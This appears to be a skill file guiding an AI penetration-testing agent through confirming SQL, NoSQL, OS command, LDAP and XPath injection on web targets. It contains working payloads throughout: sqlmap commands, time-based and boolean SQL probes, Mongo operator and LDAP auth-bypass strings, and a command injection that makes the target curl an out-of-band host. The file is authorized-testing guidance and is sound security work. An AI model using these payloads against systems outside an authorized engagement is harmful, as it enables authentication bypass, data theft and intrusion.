---
name: web-injection
description: Use when a param may reach a SQL/NoSQL/OS/LDAP/XPath interpreter — oracle-based confirmation plus sqlmap workflow. Classes sqli/nosqli/cmdi.
---

# Injection (SQL / NoSQL / command / LDAP / XPath)

Confirm injection with an **oracle** (differential, boolean, time, or out-of-band), never a single scanner hit. Start read-only and least-intrusive; time-based and stacked queries can stress the DB, so gate anything heavy behind operator approval and stay in scope.

Per candidate param: `record kind=hypothesis ... class=sqli|nosqli|cmdi outcome=testing` first.

## Find candidates
Test **every** input that could reach an interpreter — don't sample: search/filter, `id`, sort/`ORDER BY`, `LIMIT`/`OFFSET`, pagination, login fields, JSON/XML body fields, multipart filenames, cookies, path segments, and headers (`X-Forwarded-For`, `Referer`, `User-Agent`, `Host`). Harvest hidden params with `arjun -u https://TARGET/api/x` or `paramspider -d TARGET`. Feed each to the interpreter it plausibly hits (SQL, NoSQL, OS, LDAP, XPath).

## SQL injection (WSTG-INPV-05 · CWE-89)
Manual confirmation first — pick the oracle that fits:
```bash
# error-based: does a quote break it?
curl -s "https://TARGET/item?id=1'"                     # SQL error / 500 = candidate
# boolean oracle: TRUE vs FALSE must differ in response
curl -s "https://TARGET/item?id=1 AND 1=1" -o a.txt
curl -s "https://TARGET/item?id=1 AND 1=2" -o b.txt ; diff a.txt b.txt   # differ => boolean SQLi
# time oracle (blind): baseline vs delayed
time curl -s "https://TARGET/item?id=1'; SELECT pg_sleep(5)--"           # ~5s slower => time-based
# MySQL: SLEEP(5) | MSSQL: WAITFOR DELAY '0:0:5' | Oracle: dbms_pipe.receive_message
```
Then let sqlmap do the heavy lifting (save a raw request from Burp/curl for fidelity):
```bash
sqlmap -r "$PIRED_WORKSPACE/evidence/req.txt" --batch --level 3 --risk 2 --technique=BEUST --dbs \
  --output-dir="$PIRED_WORKSPACE/evidence/sqlmap"
# targeted param + safe enumeration only:
sqlmap -u "https://TARGET/item?id=1" -p id --batch --current-user --current-db
```
- **Do not** run `--dump` of production data or `--os-shell`/`--sql-shell` without explicit engagement authorization — record an `approval` blocker. Least-intrusive proof = version/current-db/one benign boolean, not a full dump.
- Union: find column count with `ORDER BY N` until it errors, then `UNION SELECT` matching types.

## NoSQL injection (CWE-943)
- Mongo-style operator injection in JSON: `{"user":"admin","pass":{"$ne":null}}` or `{"$gt":""}` to bypass auth; `{"$regex":"^a"}` to brute char-by-char (boolean oracle).
- In query strings: `user[$ne]=x`, `pass[$regex]=.*`. JS injection: `';return true;var x='`.
```bash
curl -s -H 'Content-Type: application/json' -d '{"user":"admin","pass":{"$ne":1}}' https://TARGET/login -i
```
Confirm: the `$ne`/`$gt` body authenticates where a wrong password does not.

## OS command injection (WSTG-INPV-12 · CWE-78)
- Separators: `; & | && || ` `` `$()` — try on params feeding ping/convert/export/filename.
- Blind → prove with **out-of-band** or a time delay (least destructive):
```bash
curl -s "https://TARGET/ping?host=127.0.0.1%20%26%26%20sleep%205"      # timing oracle
curl -s "https://TARGET/ping?host=127.0.0.1;curl%20http://OOB_ID.oast.pro"   # OOB DNS/HTTP via interactsh/Burp Collaborator
```
Confirm with a callback hit or a reproducible delay. Never run destructive commands (`rm`, shutdown) — `id`/`hostname`/`nslookup` is enough.

## LDAP / XPath injection (WSTG-INPV-06 · WSTG-INPV-09)
- LDAP (CWE-90): `*)(uid=*))(|(uid=*`, `admin)(&)`, `*)(|(objectclass=*` in login/search filters → auth bypass; wildcard `*` to enumerate; test both the username and password fields.
- XPath (CWE-643): `' or '1'='1`, `" or "1"="1`, `']|//user/*|//foo['`, `x' or name()='username' or 'x'='y` in XML-backed queries; blind XPath via boolean/`string-length()`/`substring()` oracle.

## False-positive gate (calibrate, don't discard)
- A WAF 403/500 is not a *confirmed* injection. Require a *consistent* oracle before `status=confirmed`: boolean pages differ reproducibly, time delay scales with the payload (2s vs 5s vs 10s), or an OOB callback lands. Re-run to rule out flakiness.
- Failing to confirm ≠ clean: an anomaly you can't yet turn into a stable oracle (one-off error, marginal timing) stays an `inconclusive` hypothesis (retained, surfaced by `recall gaps`) or an unconfirmed (`status=open`) finding — never silently dropped. Verification calibrates confidence/severity; it doesn't delete a plausible lead.

## Wire into the loop
```
record kind=hypothesis statement="id param is time-based SQLi" target=e3 class=sqli approach="pg_sleep(5) vs baseline" outcome=confirmed evidence=evidence/sqli-time.txt
record kind=finding title="Time-based blind SQLi in /item?id" severity=critical target=e3 class=sqli cwe=CWE-89 status=confirmed hypothesisId=y4 evidence=["evidence/sqlmap/log"]
```
Severity: SQLi/cmdi typically high/critical; low-impact/narrow contexts medium.

## References
- OWASP WSTG — Input Validation Testing (SQLi WSTG-INPV-05, LDAP -06, XPath -09, Command -12) — https://owasp.org/www-project-web-security-testing-guide/stable/
- OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — SQL injection — https://portswigger.net/web-security/sql-injection
- sqlmap usage (--technique BEUSTQ, --level 1-5, --risk 1-3) — https://github.com/sqlmapproject/sqlmap/wiki/Usage
- OWASP Top 10 2021 — A03:2021 Injection — https://owasp.org/Top10/A03_2021-Injection/
- CWE-89: SQL Injection — https://cwe.mitre.org/data/definitions/89.html
- CWE-78: OS Command Injection — https://cwe.mitre.org/data/definitions/78.html
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQLi) — https://cwe.mitre.org/data/definitions/943.html
